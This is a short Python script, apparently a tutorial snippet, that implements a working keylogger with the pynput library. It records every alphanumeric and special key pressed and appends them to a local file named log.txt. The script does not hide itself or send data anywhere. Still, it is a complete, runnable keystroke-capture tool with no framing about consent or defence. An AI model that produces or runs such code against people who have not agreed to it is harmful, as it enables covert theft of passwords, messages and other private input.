from pynput.keyboard import Key, Listener

# The file where keystrokes will be saved
log_file = "log.txt"

def on_press(key):
    # This function defines what to do when a key is pressed
    with open(log_file, "a") as f:
        try:
            # Log the alphanumeric key
            f.write(f"{key.char}")
        except AttributeError:
            # Log special keys (Space, Enter, etc.)
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

# This starts the "listening" process
with Listener(on_press=on_press) as listener:
    listener.join()
    